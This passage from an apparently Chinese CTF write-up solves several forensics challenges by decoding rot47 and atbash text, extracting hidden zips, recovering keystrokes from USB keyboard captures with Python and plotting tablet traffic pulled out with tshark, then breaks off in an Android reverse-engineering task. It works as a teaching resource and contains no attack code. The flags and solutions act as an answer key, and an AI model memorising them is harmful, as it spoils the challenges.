....-</code></p><p>得到压缩包密码<code>BA43BCEFC204</code></p><p>解压得到<br><code>(+w)v&amp;LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN</code></p><p>rot47</p><p><code>WZHXGU&#123;5v0u98z95u79829y7z484z54066xy08u&#125;</code></p><p>atbash</p><p><code>dasctf&#123;5e0f98a95f79829b7a484a54066cb08f&#125;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-m4a-1.png"></p><h2 id="Unkn0wnData"><a href="#Unkn0wnData" class="headerlink" title="Unkn0wnData"></a>Unkn0wnData</h2><p><em>赛后复现</em></p><p>附件结尾存在一串base64字符串</p><p><code>V2hlcmUxc0tleT8KCu2gve25g+2gve2yte2gvO28v+2gvO2+pO2gve26qu2gvO28j+2gve2wju2gvu21i+2gve26q+2gve24huKche2gvO29je2gvO2+pO2gve2wmO2gvO28j+KEueKMqO2gve24je2gvO2+iOKcie2gvu20o+2gve27qe2gvO29jO2gve26qu2gvO29tOKEueKYuu2gve26ueKdk+2gvO29tO2gve20rO2gvO28qu2gvO29te2gve2xo+2gve20hOKYg+2gve2xjO2gve24ju2gve2xjO2gve20hO2gve2xjO2gve20qu2gvO29jO2gve2xge2gvO29je2gvO29jO2gvO28j+2gvO2+g+2gve26sO2gvO29te2gve2wje2gvO2+heKche2gvO29je2gvu22k+2gve24ju2gve24iu2gvu20o+2gvO2/ue2gvO29je2gve2yp+2gve20hO2gve20hO2gvu20o+2gve2xge2gvu21i+2gve26q+KYuu2gvO29tO2gve24ge2gve26q+2gve24h+2gve26sOKPqe2gve24je2gvO28v+2gve2yte2gvu22k+2gve24h+2gve27qeKclu2gve21ue2gve2wju2gve2zgu2gve2zgu2gve2yp+2gve23ku2gve23kg==</code></p><p>解密后用<code>UTF-8</code>编码显示</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-Unkn0wnData-1.png"></p><p>stegsolve分析图片，0通道中发现一个压缩包</p><p>解压得到key.txt</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs text">data:<br>0000100000000000<br>00000c0000000000<br>00000e0000000000<br>00002a0000000000<br>0000100000000000<br>0000040000000000<br>0000080000000000<br>00002a0000000000<br>0000160000000000<br>00000b0000000000<br>00000c0000000000<br>00001c0000000000<br>00002a0000000000<br>00002c0000000000<br>0200340000000000<br>00002a0000000000<br>0200090000000000<br>00000c0000000000<br>0000110000000000<br>0000070000000000<br>0200170000000000<br>00002a0000000000<br>0200170000000000<br>00000b0000000000<br>0000080000000000<br>0000120000000000<br>00002a0000000000<br>0200150000000000<br>0000080000000000<br>0000040000000000<br>00000f0000000000<br>00000a0000000000<br>00002a0000000000<br>02000e0000000000<br>0000080000000000<br>00001c0000000000<br>00000a0000000000<br>00002a0000000000<br>0000040000000000<br>0000110000000000<br>0000070000000000<br>00000f0000000000<br>00002a0000000000<br>0200100000000000<br>0000040000000000<br>00000e0000000000<br>0000080000000000<br>0000080000000000<br>00002a0000000000<br>02000c0000000000<br>0000170000000000<br>02001e0000000000<br>0000070000000000<br>00002a0000000000<br></code></pre></td></tr></table></figure><p>明显的USB键盘流量</p><p>使用脚本提取出来</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> os<br><br>DataFileName = <span class="hljs-string">&quot;usb.dat&quot;</span><br><br>presses = []<br><br>normalKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;c&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;d&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;e&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;f&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;g&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;h&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;i&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;j&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;k&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;l&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;m&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;n&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;o&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;p&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;r&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;t&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;u&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;v&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;w&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;6&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;7&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;8&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;9&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;-&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;=&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;[&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;]&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;\\&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;&#x27;&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;,&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;/&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br>shiftKeys = &#123;<span class="hljs-string">&quot;04&quot;</span>:<span class="hljs-string">&quot;A&quot;</span>, <span class="hljs-string">&quot;05&quot;</span>:<span class="hljs-string">&quot;B&quot;</span>, <span class="hljs-string">&quot;06&quot;</span>:<span class="hljs-string">&quot;C&quot;</span>, <span class="hljs-string">&quot;07&quot;</span>:<span class="hljs-string">&quot;D&quot;</span>, <span class="hljs-string">&quot;08&quot;</span>:<span class="hljs-string">&quot;E&quot;</span>, <span class="hljs-string">&quot;09&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>, <span class="hljs-string">&quot;0a&quot;</span>:<span class="hljs-string">&quot;G&quot;</span>, <span class="hljs-string">&quot;0b&quot;</span>:<span class="hljs-string">&quot;H&quot;</span>, <span class="hljs-string">&quot;0c&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>, <span class="hljs-string">&quot;0d&quot;</span>:<span class="hljs-string">&quot;J&quot;</span>, <span class="hljs-string">&quot;0e&quot;</span>:<span class="hljs-string">&quot;K&quot;</span>, <span class="hljs-string">&quot;0f&quot;</span>:<span class="hljs-string">&quot;L&quot;</span>, <span class="hljs-string">&quot;10&quot;</span>:<span class="hljs-string">&quot;M&quot;</span>, <span class="hljs-string">&quot;11&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>, <span class="hljs-string">&quot;12&quot;</span>:<span class="hljs-string">&quot;O&quot;</span>, <span class="hljs-string">&quot;13&quot;</span>:<span class="hljs-string">&quot;P&quot;</span>, <span class="hljs-string">&quot;14&quot;</span>:<span class="hljs-string">&quot;Q&quot;</span>, <span class="hljs-string">&quot;15&quot;</span>:<span class="hljs-string">&quot;R&quot;</span>, <span class="hljs-string">&quot;16&quot;</span>:<span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;17&quot;</span>:<span class="hljs-string">&quot;T&quot;</span>, <span class="hljs-string">&quot;18&quot;</span>:<span class="hljs-string">&quot;U&quot;</span>, <span class="hljs-string">&quot;19&quot;</span>:<span class="hljs-string">&quot;V&quot;</span>, <span class="hljs-string">&quot;1a&quot;</span>:<span class="hljs-string">&quot;W&quot;</span>, <span class="hljs-string">&quot;1b&quot;</span>:<span class="hljs-string">&quot;X&quot;</span>, <span class="hljs-string">&quot;1c&quot;</span>:<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;1d&quot;</span>:<span class="hljs-string">&quot;Z&quot;</span>,<span class="hljs-string">&quot;1e&quot;</span>:<span class="hljs-string">&quot;!&quot;</span>, <span class="hljs-string">&quot;1f&quot;</span>:<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-string">&quot;20&quot;</span>:<span class="hljs-string">&quot;#&quot;</span>, <span class="hljs-string">&quot;21&quot;</span>:<span class="hljs-string">&quot;$&quot;</span>, <span class="hljs-string">&quot;22&quot;</span>:<span class="hljs-string">&quot;%&quot;</span>, <span class="hljs-string">&quot;23&quot;</span>:<span class="hljs-string">&quot;^&quot;</span>,<span class="hljs-string">&quot;24&quot;</span>:<span class="hljs-string">&quot;&amp;&quot;</span>,<span class="hljs-string">&quot;25&quot;</span>:<span class="hljs-string">&quot;*&quot;</span>,<span class="hljs-string">&quot;26&quot;</span>:<span class="hljs-string">&quot;(&quot;</span>,<span class="hljs-string">&quot;27&quot;</span>:<span class="hljs-string">&quot;)&quot;</span>,<span class="hljs-string">&quot;28&quot;</span>:<span class="hljs-string">&quot;&lt;RET&gt;&quot;</span>,<span class="hljs-string">&quot;29&quot;</span>:<span class="hljs-string">&quot;&lt;ESC&gt;&quot;</span>,<span class="hljs-string">&quot;2a&quot;</span>:<span class="hljs-string">&quot;&lt;DEL&gt;&quot;</span>, <span class="hljs-string">&quot;2b&quot;</span>:<span class="hljs-string">&quot;\t&quot;</span>,<span class="hljs-string">&quot;2c&quot;</span>:<span class="hljs-string">&quot;&lt;SPACE&gt;&quot;</span>,<span class="hljs-string">&quot;2d&quot;</span>:<span class="hljs-string">&quot;_&quot;</span>,<span class="hljs-string">&quot;2e&quot;</span>:<span class="hljs-string">&quot;+&quot;</span>,<span class="hljs-string">&quot;2f&quot;</span>:<span class="hljs-string">&quot;&#123;&quot;</span>,<span class="hljs-string">&quot;30&quot;</span>:<span class="hljs-string">&quot;&#125;&quot;</span>,<span class="hljs-string">&quot;31&quot;</span>:<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-string">&quot;32&quot;</span>:<span class="hljs-string">&quot;&lt;NON&gt;&quot;</span>,<span class="hljs-string">&quot;33&quot;</span>:<span class="hljs-string">&quot;\&quot;&quot;</span>,<span class="hljs-string">&quot;34&quot;</span>:<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-string">&quot;35&quot;</span>:<span class="hljs-string">&quot;&lt;GA&gt;&quot;</span>,<span class="hljs-string">&quot;36&quot;</span>:<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;37&quot;</span>:<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;38&quot;</span>:<span class="hljs-string">&quot;?&quot;</span>,<span class="hljs-string">&quot;39&quot;</span>:<span class="hljs-string">&quot;&lt;CAP&gt;&quot;</span>,<span class="hljs-string">&quot;3a&quot;</span>:<span class="hljs-string">&quot;&lt;F1&gt;&quot;</span>,<span class="hljs-string">&quot;3b&quot;</span>:<span class="hljs-string">&quot;&lt;F2&gt;&quot;</span>, <span class="hljs-string">&quot;3c&quot;</span>:<span class="hljs-string">&quot;&lt;F3&gt;&quot;</span>,<span class="hljs-string">&quot;3d&quot;</span>:<span class="hljs-string">&quot;&lt;F4&gt;&quot;</span>,<span class="hljs-string">&quot;3e&quot;</span>:<span class="hljs-string">&quot;&lt;F5&gt;&quot;</span>,<span class="hljs-string">&quot;3f&quot;</span>:<span class="hljs-string">&quot;&lt;F6&gt;&quot;</span>,<span class="hljs-string">&quot;40&quot;</span>:<span class="hljs-string">&quot;&lt;F7&gt;&quot;</span>,<span class="hljs-string">&quot;41&quot;</span>:<span class="hljs-string">&quot;&lt;F8&gt;&quot;</span>,<span class="hljs-string">&quot;42&quot;</span>:<span class="hljs-string">&quot;&lt;F9&gt;&quot;</span>,<span class="hljs-string">&quot;43&quot;</span>:<span class="hljs-string">&quot;&lt;F10&gt;&quot;</span>,<span class="hljs-string">&quot;44&quot;</span>:<span class="hljs-string">&quot;&lt;F11&gt;&quot;</span>,<span class="hljs-string">&quot;45&quot;</span>:<span class="hljs-string">&quot;&lt;F12&gt;&quot;</span>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-comment"># read data</span><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;key.txt&#x27;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>            presses.append(line[<span class="hljs-number">0</span>:-<span class="hljs-number">1</span>])<br>    <span class="hljs-comment"># handle</span><br>    result = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> press <span class="hljs-keyword">in</span> presses:<br>        <span class="hljs-keyword">if</span> press == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-keyword">in</span> press:<br>            Bytes = press.split(<span class="hljs-string">&quot;:&quot;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            Bytes = [press[i:i+<span class="hljs-number">2</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(press), <span class="hljs-number">2</span>)]<br>        <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;00&quot;</span>:<br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += normalKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b10</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">int</span>(Bytes[<span class="hljs-number">0</span>],<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0b100000</span>: <span class="hljs-comment"># shift key is pressed.</span><br>            <span class="hljs-keyword">if</span> Bytes[<span class="hljs-number">2</span>] != <span class="hljs-string">&quot;00&quot;</span> <span class="hljs-keyword">and</span> normalKeys.get(Bytes[<span class="hljs-number">2</span>]):<br>                result += shiftKeys[Bytes[<span class="hljs-number">2</span>]]<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[-] Unknow Key : %s&quot;</span> % (Bytes[<span class="hljs-number">0</span>]))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Found : %s&quot;</span> % (result))<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>得到<code>mik&lt;DEL&gt;mae&lt;DEL&gt;shiy&lt;DEL&gt;&lt;SPACE&gt;:&lt;DEL&gt;FindT&lt;DEL&gt;Theo&lt;DEL&gt;Realg&lt;DEL&gt;Keyg&lt;DEL&gt;andl&lt;DEL&gt;Makee&lt;DEL&gt;It!d&lt;DEL&gt;</code></p><p>去掉删除的字符应该是<code>mimashi FindTheRealKeyandMakeIt!</code>，但是这句话的意思让我们找到真正的key，所以这个应该是假的key</p><p>仔细观察删掉的字符，发现正好是key开头，提取出来得到<code>key:Toggled</code></p><p>emoji-aes解密得到flag</p><h2 id="hard-Digital-plate"><a href="#hard-Digital-plate" class="headerlink" title="hard_Digital_plate"></a>hard_Digital_plate</h2><p><em>赛后复现</em></p><p><code>foremost</code>可以分离出一张图片，根据名字猜测是<code>oursecret</code>隐写</p><p>流量分析，发现是数位板流量</p><p>tshark提取<br><code>tshark -r hard_Digital_plate.pcapng -T fields -e usbhid.data | sed &#39;/^\s*$/d&#39; &gt; out.txt</code></p><p>python提取坐标</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    result.write(<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-built_in">str</span>(-y)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>keys.close()<br>result.close()<br></code></pre></td></tr></table></figure><p><code>gnuplot</code>画图</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-1.png"></p><p>得到<code>oursecret</code>密码<code>kfae5y4wi2shwj81y2kda6ax7x</code></p><p>解一下<code>oursecret</code>，拿到<code>U2FsdGVkX18jQgWzhln3pPiVK8gaBxIzhY1JWcFlKiRdBkV/jDmEBxJV9PZmwBJ7MU3IdNf4hWryZLYRLuxA4w==</code></p><p>图片备注中看到<code>糟糕，好像有几个字写的太轻了，看不清楚</code></p><p>提取低压感数据，以<code>0xf000</code>作为压感临界值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">nums = []<br>keys = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;out.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>result = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> keys:<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>:<br>        <span class="hljs-keyword">continue</span><br>    x = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">4</span>:<span class="hljs-number">6</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">6</span>:<span class="hljs-number">8</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    y = <span class="hljs-built_in">int</span>(line[<span class="hljs-number">8</span>:<span class="hljs-number">10</span>], <span class="hljs-number">16</span>) + <span class="hljs-built_in">int</span>(line[<span class="hljs-number">10</span>:<span class="hljs-number">12</span>], <span class="hljs-number">16</span>) * <span class="hljs-number">0xff</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(line[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>], <span class="hljs-number">16</span>) &lt; <span class="hljs-number">0xf000</span>:<br>        result.write(<span class="hljs-built_in">str</span>(x)+<span class="hljs-string">&#x27; &#x27;</span>+<span class="hljs-built_in">str</span>(-y)+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>keys.close()<br>result.close()<br></code></pre></td></tr></table></figure><p><code>gnuplot</code>画图</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-2.png"></p><p>得到<code>key</code>：<code>w12kax</code></p><p>aes解密</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-hard_Digital_plate-3.png"></p><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><h2 id="ezandroid"><a href="#ezandroid" class="headerlink" title="ezandroid"></a>ezandroid</h2><p>先安装apk，随意输入一个值，返回<code>error！</code></p><p>jadx中搜索关键字，得到判断代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;Integer&gt; ccompare = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>(Arrays.asList(<span class="hljs-built_in">this</span>.compare));<br>Integer[] compare = &#123;<span class="hljs-number">404</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">368</span>, <span class="hljs-number">220</span>, <span class="hljs-number">436</span>, <span class="hljs-number">412</span>, <span class="hljs-number">452</span>, <span class="hljs-number">432</span>, IntegvalueOf((<span class="hljs-type">int</span>) ItemTouchHelper.Callback.DEFAULT_DRAG_ANIMATION_DURATION412&#125;;<br><span class="hljs-type">String</span> <span class="hljs-variable">mname</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;ccadwjlyah&quot;</span>;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">onClick</span><span class="hljs-params">(View v)</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> MainActivity.<span class="hljs-built_in">this</span>.name.getText().toString().trim();<br>    List&lt;Integer&gt; ppwd = MainActivity.change(MainActivity.<span class="hljs-built_in">this</span>.pass.getT().toString().trim());<br>    <span class="hljs-keyword">if</span> (!user.equals(<span class="hljs-built_in">this</span>.mname) || !ppwd.equals(<span class="hljs-built_in">this</span>.ccompare)) &#123;<br>        Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;error！&quot;</span>, <span class="hljs-number">0</span>).show();<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    Toast.makeText(MainActivity.<span class="hljs-built_in">this</span>, <span class="hljs-string">&quot;correct！&quot;</span>, 